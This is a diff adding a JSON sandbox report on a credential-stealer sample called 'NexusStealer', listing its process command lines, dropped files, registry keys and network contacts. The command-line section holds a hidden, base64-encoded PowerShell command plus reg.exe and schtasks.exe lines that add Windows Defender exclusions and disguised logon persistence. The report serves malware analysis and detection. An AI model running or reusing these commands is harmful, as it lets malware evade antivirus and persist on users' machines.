@@ -1,0 +1,61 @@
+{
+  "family": "NexusStealer",
+  "threadname": "Nexus/variant1",
+  "commandlines": [
+    "C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Temp\\\\mlwr\\\\Nexus_v2.21\\\\Nexus.exe",
+    "\"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\" --headless --incognito",
+    "\"C:\\\\Program Files\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\" --headless --disable-gpu",
+    "\"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\" --headless --disable-gpu",
+    "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABsAGEAPQAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAOwAkAHAAMQA9ACgAJABsAGEAIAArACAAKAAnAFwAJwArACcATQBpAGMAcgBvAHMAbwBmACcAKwAnAHQAXABPAGYAZgBpAGMAZQAnACsAJwBCACcAKwAnAHIAbwBrACcAKwAnAGUAJwArACcAcgAnACkAKQA7ACQAcAAyAD0AKAAkAGwAYQAgACsAIAAoACcAXABQAGEAYwBrAGEAJwArACcAZwBlAHMAXABNACcAKwAnAGkAYwByACcAKwAnAG8AcwBvAGYAJwArACcAdAAuAFcAaQAnACsAJwBuACcAKwAnAGQAbwB3AHMALgBQAGUAbwAnACsAJwBwAGwAZQBFACcAKwAnAHgAJwArACcAcABlAHIAaQBlAG4AYwBlACcAKwAnAEgAbwBzAHQAXwBnAHcAJwArACcAMQBuADEAYwAyAGYAaAAnACsAJwB5AGUAJwArACcAcQAnACsAJwB5ACcAKQApADsAJABwADIAdAA9ACgAJABwADIAIAArACAAKAAtAGoAbwBpAG4AKAAnAFwAQQBDACcALAAnAFwAVABlACcALAAnAG0AcAAnACkAKQApADsATgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwADEAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAALQBGAG8AcgBjAGUAfABPAHUAdAAtAE4AdQBsAGwAOwBOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAHAAMgB0ACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAC0ARgBvAHIAYwBlAHwATwB1AHQALQBOAHUAbABsADsAYQB0AHQAcgBpAGIAIAArAGgAIAArAHMAIAAkAHAAMQA7AGEAdAB0AHIAaQBiACAAKwBoACAAKwBzACAAJABwADIAOwByAGUAZwAgAGEAZABkACAAKAAtAGoAbwBpAG4AKAAnAEgASwAnACwAJwBMAE0AJwAsACcAXABTACcALAAnAE8ARgBUAFcAQQBSAEUAXAAnACwAJwBQAG8AbABpACcALAAnAGMAaQBlACcALAAnAHMAXABNAGkAYwByAG8AJwAsACcAcwBvAGYAdABcAFcAJwAsACcAaQBuAGQAbwAnACwAJwB3AHMAIABEAGUAZgBlAG4AJwAsACcAZABlAHIAXABFAHgAYwAnACwAJwBsAHUAcwAnACwAJwBpAG8AbgBzAFwAUABhACcALAAnAHQAJwAsACcAaABzACcAKQApACAALwBmACAALwByAGUAZwA6ADYANAA7AHIAZQBnACAAYQBkAGQAIAAoAC0AagBvAGkAbgAoACcASAAnACwAJwBLAEwATQBcAFMATwBGAFQAJwAsACcAVwBBAFIARQAnACwAJwBcAFAAbwBsAGkAYwAnACwAJwBpAGUAcwBcAE0AaQBjAHIAJwAsACcAbwBzAG8AZgB0AFwAJwAsACcAVwBpAG4AZAAnACwAJwBvAHcAcwAgAEQAZQAnACwAJwBmAGUAbgBkAGUAJwAsACcAcgAnACwAJwBcAEUAeABjAGwAdQBzAGkAJwAsACcAbwBuAHMAXAAnACwAJwBQAGEAdABoAHMAJwApACkAIAAvAHYAIAAkAHAAMQAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMAAgAC8AZgAgAC8AcgBlAGcAOgA2ADQAOwByAGUAZwAgAGEAZABkACAAKAAtAGoAbwBpAG4AKAAnAEgASwBMAE0AXABTAE8ARgAnACwAJwBUAFcAJwAsACcAQQBSAEUAXABQACcALAAnAG8AbABpAGMAaQBlAHMAXAAnACwAJwBNAGkAYwByAG8AcwAnACwAJwBvAGYAdABcAFcAaQBuAGQAJwAsACcAbwB3AHMAIABEAGUAJwAsACcAZgBlAG4AZAAnACwAJwBlAHIAJwAsACcAXABFAHgAYwBsAHUAcwBpACcALAAnAG8AbgBzACcALAAnAFwAUABhAHQAaABzACcAKQApACAALwB2ACAAJABwADIAIAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADAAIAAvAGYAIAAvAHIAZQBnADoANgA0ADsAdAByAHkAewBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABwADEAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA7AEEAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIAAkAHAAMgAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlADsAfQBjAGEAdABjAGgAewB9AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABnAHAAdQBwAGQAYQB0AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAvAGYAbwByAGMAZQAnACwAJwAvAHQAYQByAGcAZQB0ADoAYwBvAG0AcAB1AHQAZQByACcAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBXAGEAaQB0ACAAMgA+ACQAbgB1AGwAbAA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADIAMAA7AHMAYwBoAHQAYQBzAGsAcwAgAC8AYwByAGUAYQB0AGUAIAAvAHQAbgAgACgAJwBXAGkAbgBkAG8AdwBzACcAKwAnAFMAJwArACcAeQBzAHQAZQBtAFMAZQAnACsAJwByAHYAaQBjAGUAJwApACAALwB0AHIAIAAoACQAcAAxACAAKwAgACgALQBqAG8AaQBuACgAJwBcACcALAAnAHMAdgBjAGgAJwAsACcAbwBzAHQALgBlACcALAAnAHgAZQAnACkAKQApACAALwBzAGMAIABvAG4AbABvAGcAbwBuACAALwByAGwAIABoAGkAZABkAGUAbgA7AA==",
+    "C:\\\\Windows\\\\system32\\\\attrib.exe +h +s C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Microsoft\\\\OfficeBroker",
+    "C:\\\\Windows\\\\system32\\\\reg.exe add \"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Paths\" /f /reg:64",
+    "C:\\\\Windows\\\\system32\\\\reg.exe add \"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Paths\" /v C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Microsoft\\\\OfficeBroker /t REG_DWORD /d 0 /f /reg:64",
+    "C:\\\\Windows\\\\system32\\\\reg.exe add \"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Paths\" /v C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_gw1n1c2fhyeqy /t REG_DWORD /d 0 /f /reg:64",
+    "C:\\\\Windows\\\\system32\\\\schtasks.exe /create /tn WindowsSystemService /tr C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Microsoft\\\\OfficeBroker\\\\svchost.exe /sc onlogon /rl highest /f",
+    "C:\\\\Windows\\\\system32\\\\schtasks.exe /create /tn RuntimeBrokerService /tr \"C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_gw1n1c2fhyeqy\\\\AC\\\\Temp\\\\RuntimeBroker.exe -Embedding\" /sc onlogon /rl highest /f"
+  ],
+  "writtenfiles": [
+    "C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Temp\\\\mlwr\\\\Nexus_v2.21\\\\Nexus.exe",
+    "C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Microsoft\\\\OfficeBroker\\\\svchost.exe",
+    "C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_gw1n1c2fhyeqy\\\\AC\\\\Temp\\\\RuntimeBroker.exe",
+    "C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Temp\\\\ULhAHHgbc1.vbs"
+  ],
+  "registry": [
+    "HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System",
+    "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Paths"
+  ],
+  "apicalls": [
+    "reg.exe",
+    "attrib.exe",
+    "schtasks.exe",
+    "gpupdate.exe",
+    "wmic.exe",
+    "cscript.exe",
+    "Invoke-RestMethod",
+    "Add-MpPreference",
+    "AdjustTokenPrivileges",
+    "WriteProcessMemory"
+  ],
+  "network": [
+    {
+      "host": "t.me",
+      "port": 443,
+      "packagecontent": "GET /dusty_vintage"
+    },
+    {
+      "host": "angry-toaster.com",
+      "port": 443,
+      "packagecontent": "POST /"
+    },
+    {
+      "host": "c.pki.goog",
+      "port": 80,
+      "packagecontent": "GET /r/r1.crl"
+    },
+    {
+      "host": "tse1.mm.bing.net",
+      "port": 443,
+      "packagecontent": ""
+    }
+  ]
+}
